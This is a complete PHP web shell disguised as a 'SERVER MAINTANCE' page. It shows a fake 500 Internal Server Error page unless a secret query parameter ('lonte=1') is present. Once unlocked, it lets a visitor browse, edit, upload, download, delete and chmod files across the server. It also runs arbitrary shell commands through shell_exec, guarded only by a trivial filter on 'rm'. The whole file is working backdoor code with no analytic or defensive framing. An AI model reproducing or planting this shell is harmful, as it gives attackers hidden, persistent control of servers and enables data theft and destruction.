<?php
if(!isset($_GET['lonte']) || $_GET['lonte'] !== '1'){
    http_response_code(500);
    ?>
<!DOCTYPE html>
<html>
<head>
    <title>500 Internal Server Error</title>
</head>
<body>
    <h1>Internal Server Error</h1>
    <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
    <hr>
    <address><?=$_SERVER['SERVER_SOFTWARE']??'Apache'?> Server at <?=htmlspecialchars($_SERVER['SERVER_NAME'])?> Port <?=htmlspecialchars($_SERVER['SERVER_PORT'])?></address>
</body>
</html>
<?php exit; }

$cwd = isset($_GET['cwd']) ? $_GET['cwd'] : getcwd();
$cwd = realpath($cwd) ?: getcwd();
$msg = '';
$self_url = strtok($_SERVER['REQUEST_URI'], '?') . '?lonte=1';

// Fungsi untuk mendapatkan izin file/folder
function perms($f)
{
    $p = @fileperms($f);
    $i = '';
    if (($p & 0xC000) == 0xC000) {
        $i = 's';
    } elseif (($p & 0xA000) == 0xA000) {
        $i = 'l';
    } elseif (($p & 0x8000) == 0x8000) {
        $i = '-';
    } elseif (($p & 0x6000) == 0x6000) {
        $i = 'b';
    } elseif (($p & 0x4000) == 0x4000) {
        $i = 'd';
    } elseif (($p & 0x2000) == 0x2000) {
        $i = 'c';
    } elseif (($p & 0x1000) == 0x1000) {
        $i = 'p';
    } else {
        $i = 'u';
    }
    $i .= (($p & 0x0100) ? 'r' : '-');
    $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-');
    $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-');
    $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}

function perms_color($f)
{
    $rw = is_readable($f);
    $ww = is_writable($f);
    return ($rw || $ww) ? 'perm-green' : 'perm-white';
}

function list_dir($d, $u)
{
    $o = "<table class='filelist'><tr>
    <th>Name</th><th>Size</th><th>Modified</th><th>Owner</th><th>Perms</th><th>Action</th></tr>";
    if ($d !== '/' && $d !== '' && $d !== false) {
        $p = dirname($d);
        $o .= "<tr><td colspan='6'><a href=\"{$u}&cwd=" . urlencode($p) . "\" class='action-link'>&larr;Back</a></td></tr>";
    }
    $fs = @scandir($d);
    if ($fs) {
        foreach ($fs as $f) {
            if ($f == '.') continue;
            $path = $d . DIRECTORY_SEPARATOR . $f;
            $disp = htmlspecialchars($f);
            $size = is_dir($path) ? '-' : @filesize($path);
            $mtime = @date('Y-m-d H:i:s', @filemtime($path));
            $owner = @function_exists('posix_getpwuid') ? @posix_getpwuid(@fileowner($path))['name'] : @fileowner($path);
            $perm = perms($path);
            $permclass = perms_color($path);
            $acts = '';
            if (is_dir($path)) {
                $disp = "<span class='folder-color'>{$disp}</span>";
                $acts .= "<a href=\"{$u}&cwd=" . urlencode($path) . "\" class='action-link'>Open</a>";
                if ($f !== '..') $acts .= " | <a href=\"{$u}&cwd=" . urlencode($d) . "&del=" . urlencode($f) . "\" class='action-link' onclick=\"return confirm('Delete directory?')\">Delete</a>";
                $acts .= " | <a href=\"{$u}&cwd=" . urlencode($d) . "&moddate=" . urlencode($f) . "\" class='action-link'>Modify Date</a>";
                $acts .= " | <a href=\"{$u}&cwd=" . urlencode($d) . "&rename=" . urlencode($f) . "\" class='action-link'>Rename</a>";
                $acts .= " | <a href=\"{$u}&cwd=" . urlencode($d) . "&chmod=" . urlencode($f) . "\" class='action-link'>Edit CHMOD</a>";
            } else {
                $disp = "<span class='file-color'>{$disp}</span>";
                $acts .= "<a href=\"{$u}&cwd=" . urlencode($d) . "&edit=" . urlencode($f) . "\" class='action-link'>Edit</a> | ";
                $acts .= "<a href=\"{$u}&cwd=" . urlencode($d) . "&download=" . urlencode($f) . "\" class='action-link'>Download</a> | ";
                $acts .= "<a href=\"{$u}&cwd=" . urlencode($d) . "&del=" . urlencode($f) . "\" class='action-link' onclick=\"return confirm('Delete file?')\">Delete</a> | ";
                $acts .= "<a href=\"{$u}&cwd=" . urlencode($d) . "&moddate=" . urlencode($f) . "\" class='action-link'>Modify Date</a>";
                $acts .= " | <a href=\"{$u}&cwd=" . urlencode($d) . "&rename=" . urlencode($f) . "\" class='action-link'>Rename</a>";
                $acts .= " | <a href=\"{$u}&cwd=" . urlencode($d) . "&chmod=" . urlencode($f) . "\" class='action-link'>Edit CHMOD</a>";
            }
            $o .= "<tr>
        <td>{$disp}</td>
        <td style='text-align:right;'>{$size}</td>
        <td>{$mtime}</td>
        <td>{$owner}</td>
        <td class='{$permclass}'>{$perm}</td>
        <td>{$acts}</td>
        </tr>";
        }
    }
    $o .= "</table>";
    return $o;
}

// --- ACTIONS ---

// Rename file/folder
if (isset($_GET['rename']) && $_GET['rename']) {
    $oldname = $_GET['rename'];
    $oldpath = $cwd . DIRECTORY_SEPARATOR . $oldname;
    if (isset($_POST['newname']) && $_POST['newname'] != '') {
        $newname = $_POST['newname'];
        $newpath = dirname($oldpath) . DIRECTORY_SEPARATOR . $newname;
        if (rename($oldpath, $newpath)) {
            $msg = "<b style='color:green;'>Renamed: " . htmlspecialchars($oldname) . " to " . htmlspecialchars($newname) . "</b><br>";
        } else {
            $msg = "<b style='color:red;'>Rename failed!</b><br>";
        }
    }
}

// --- DELETE ACTION ---
if (isset($_GET['del']) && $_GET['del']) {
    $file = $cwd . DIRECTORY_SEPARATOR . $_GET['del'];

    if (is_dir($file)) {
        // If it's a directory, delete all contents first before removing the directory
        function delete_dir($dir)
        {
            $files = array_diff(scandir($dir), array('.', '..'));
            foreach ($files as $file) {
                $filePath = $dir . DIRECTORY_SEPARATOR . $file;
                if (is_dir($filePath)) {
                    delete_dir($filePath); // Recursive delete for directories
                } else {
                    unlink($filePath); // Delete file
                }
            }
            rmdir($dir); // Remove empty directory
        }

        delete_dir($file);
        $msg = "<b style='color:green;'>Directory deleted successfully.</b><br>";
    } else {
        if (unlink($file)) {
            $msg = "<b style='color:green;'>File deleted successfully: " . htmlspecialchars($_GET['del']) . "</b><br>";
        } else {
            $msg = "<b style='color:red;'>Delete failed!</b><br>";
        }
    }
}

// --- UPLOAD ACTION ---
if (isset($_POST['_upl']) && isset($_FILES['file'])) {
    $targetDir = rtrim($cwd, '/\\') . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetDir)) {
        $msg = "<b style='color:green;'>File uploaded successfully: " . htmlspecialchars($targetDir) . "</b><br>";
    } else {
        $msg = "<b style='color:red;'>File upload failed!</b><br>";
    }
}

// --- TERMINAL ACTION ---
$out = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];

    // Validate and sanitize user input
    if (strpos($cmd, 'rm ') !== false || strpos($cmd, 'rm -rf ') !== false) {
        $out = "Dangerous command detected!";
    } else {
        $out = shell_exec($cmd);  // Run the command safely
    }
}

// --- EDIT CHMOD ACTION ---
if (isset($_GET['chmod']) && $_GET['chmod']) {
    $fileToEdit = $cwd . DIRECTORY_SEPARATOR . $_GET['chmod'];
    if (is_file($fileToEdit) || is_dir($fileToEdit)) {
        if (isset($_POST['newchmod'])) {
            $newChmod = $_POST['newchmod'];
            // Change the file permissions using chmod
            if (chmod($fileToEdit, octdec($newChmod))) {
                $msg = "<b style='color:green;'>Permissions updated successfully: " . htmlspecialchars($newChmod) . "</b><br>";
            } else {
                $msg = "<b style='color:red;'>Failed to update permissions!</b><br>";
            }
        } else {
            // Show the current permissions in the modal
            $currentChmod = substr(sprintf('%o', fileperms($fileToEdit)), -4);
        }
    }
}

// --- EDIT FILE ACTION ---
if (isset($_GET['edit']) && $_GET['edit']) {
    $fileToEdit = $cwd . DIRECTORY_SEPARATOR . $_GET['edit'];
    if (is_file($fileToEdit)) {
        if (isset($_POST['filecontent'])) {
            // Save the edited file content
            file_put_contents($fileToEdit, $_POST['filecontent']);
            $msg = "<b style='color:green;'>File saved: " . htmlspecialchars($_GET['edit']) . "</b><br>";
        } else {
            // Show the content of the file in the modal
            $fileContent = htmlspecialchars(file_get_contents($fileToEdit));
        }
    }
}

// --- DOWNLOAD ACTION ---
if (isset($_GET['download']) && $_GET['download']) {
    $file = $cwd . DIRECTORY_SEPARATOR . $_GET['download'];

    // Ensure the file exists
    if (is_file($file)) {
        // Set headers to prompt the browser to download the file
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Transfer-Encoding: binary');
        header('Content-Length: ' . filesize($file));

        // Output the file content
        readfile($file);
        exit;
    } else {
        $msg = "<b style='color:red;'>File not found!</b><br>";
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SERVER MAINTANCE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        /* Background Color - Black to Red */
        body { background: linear-gradient(to bottom, #000000, #ff0000); font-family: Arial, sans-serif; color: #eee; }
        .container { max-width: 950px; margin: 30px auto; background: #2c2f36; border-radius: 10px; box-shadow: 0 2px 8px #111; padding: 30px; }
        h2 { text-align: center; color: #ff5252; margin-bottom: 0; }
        .subtitle { text-align: center; color: #aaa; margin-bottom: 20px; }
        .section { margin-bottom: 25px; }
        label { font-weight: bold; }
        .filelist a, .action-link { color: #fff !important; text-decoration: underline; }
        .filelist a:hover, .action-link:hover { color: #ff5252 !important; }
        input[type="text"], input[type="file"], input[type="datetime-local"], textarea { width: 100%; margin: 8px 0 16px 0; padding: 8px; border-radius: 4px; border: 1px solid #444; background: #23272e; color: #eee; }
        input[type="submit"], button { padding: 8px 20px; border-radius: 4px; border: none; background: #ff5252; color: #fff; font-weight: bold; cursor: pointer; }
        input[type="submit"]:hover, button:hover { background: #b71c1c; }
        .output { background: #181a1b; color: #eee; padding: 12px; border-radius: 6px; font-family: monospace; white-space: pre-wrap; }
        .message { margin-bottom: 20px; }
        .filelist { width: 100%; border-collapse: collapse; background: #23272e; border-radius: 8px; margin-bottom: 20px; }
        .filelist th, .filelist td { border: 1px solid #333; padding: 6px 10px; font-size: 14px; }
        .filelist th { background: #181a1b; color: #ff5252; }
        .filelist tr:hover { background: #181a1b; }
        .perm-green { background: #1e2e1e; color: #4caf50; font-weight: bold; }
        .perm-white { background: #23272e; color: #eee; }
        .folder-color { color: #4caf50; font-weight: bold; }
        .file-color { color: #ff5252; font-weight: bold; }
        .fileview, .fileedit { background: #181a1b; color: #eee; border-radius: 8px; padding: 10px 20px; margin-bottom: 20px; font-family: monospace; white-space: pre-wrap; }
        .fileedit textarea { background: #23272e; color: #eee; font-family: monospace; width: 100%; min-height: 300px; border: 1px solid #444; }
        .flexbar {
            display: flex;
            flex-wrap: wrap;
            gap: 18px;
            margin-bottom: 25px;
            justify-content: flex-start;
            align-items: flex-end;
        }
        .flexbar form {
            background: #23272e;
            padding: 0;
            border-radius: 8px;
            min-width: 220px;
            flex: 1 1 220px;
        }
        .flexbar label {
            color: #fff;
            font-weight: bold;
            margin-bottom: 4px;
            display: block;
        }
        .flexbar input[type="text"], .flexbar input[type="file"], .flexbar input[type="datetime-local"], .flexbar textarea {
            width: 100%;
            margin-bottom: 8px;
        }
        .flexbar input[type="submit"], .flexbar button {
            width: 100%;
            margin-bottom: 0;
        }
        .newfilebar {
            background: #23272e;
            border-radius: 8px;
            margin-bottom: 25px;
            padding: 18px 18px 12px 18px;
        }
        .newfilebar label { color: #fff; font-weight: bold; margin-bottom: 4px; display: block; }
        .newfilebar input[type="text"], .newfilebar textarea { width: 100%; margin-bottom: 8px; }
        .newfilebar input[type="submit"] { width: 100%; }
        @media (max-width: 900px) {
            .flexbar { flex-direction: column; }
            .flexbar form { min-width: 0; }
            .newfilebar { padding: 12px 8px 8px 8px; }
        }
        #modal-bg { position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.7);z-index:9999; }
        #modal-box { position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#23272e;min-width:400px;max-width:90vw;max-height:90vh;overflow:auto;border-radius:10px;box-shadow:0 2px 16px #000;padding:24px 18px 18px 18px;z-index:10000; }
        #modal-box textarea { background:#181a1b;color:#eee;border:1px solid #444; }
        #modal-box pre { background:#181a1b;color:#eee; }
        #modal-box .modal-title { font-size:18px;font-weight:bold;margin-bottom:12px;color:#ff5252; }
        #modal-box .modal-actions { margin-top:10px;text-align:right; }
    </style>
</head>
<body>
    <div class="container">
        <center><h1>SERVER MAINTANCE</h1></center>
	<center><h2>User : <?php echo shell_exec('whoami'); ?></h2>
        <h3><div class="subtitle"><?php echo php_uname(); ?></div><h3>
        <?php if ($msg) echo '<div class="message">' . $msg . '</div>'; ?>
        <div class="section">
            <b>Current Directory:</b> 
            <a href="<?= $self_url ?>&cwd=<?= urlencode($cwd) ?>" class="action-link"><?= htmlspecialchars($cwd) ?></a>
            <?= list_dir($cwd, $self_url) ?>
        </div>

        <!-- File Upload Section -->
        <div class="flexbar">
            <form method="post" enctype="multipart/form-data" action="<?= $self_url ?>&cwd=<?= urlencode($cwd) ?>">
                <label>Upload File:</label>
                <input type="file" name="file" required>
                <input type="submit" name="_upl" value="Upload">
            </form>
        </div>

        <!-- Terminal Section -->
        <div class="flexbar">
            <form method="POST" action="<?= $self_url ?>&cwd=<?= urlencode($cwd) ?>">
                <label>Terminal:</label>
                <input type="text" name="cmd" placeholder="Enter command">
                <input type="submit" value="Execute">
            </form>
            <div class="output">
                <pre><?= htmlspecialchars($out) ?></pre>
            </div>
        </div>

        <!-- Rename File / Folder -->
        <div class="flexbar">
            <?php if (isset($_GET['rename'])): ?>
            <form method="POST" action="<?= $self_url ?>&cwd=<?= urlencode($cwd) ?>&rename=<?= urlencode($_GET['rename']) ?>">
                <label>Rename:</label>
                <input type="text" name="newname" placeholder="New Name" required>
                <input type="submit" value="Rename">
            </form>
            <?php endif; ?>
        </div>

        <!-- Edit File Popup Modal -->
        <?php if (isset($fileContent)): ?>
        <div id="modal-bg">
            <div id="modal-box">
                <div class="modal-title">Edit File: <?= htmlspecialchars($fileToEdit) ?></div>
                <form method="POST" action="<?= $self_url ?>&cwd=<?= urlencode($cwd) ?>&edit=<?= urlencode($_GET['edit']) ?>">
                    <textarea name="filecontent" required><?= $fileContent ?></textarea>
                    <div class="modal-actions">
                        <button type="button" onclick="document.getElementById('modal-bg').style.display='none';">Close</button>
                        <input type="submit" value="Save">
                    </div>
                </form>
            </div>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>
<?php
// END
?>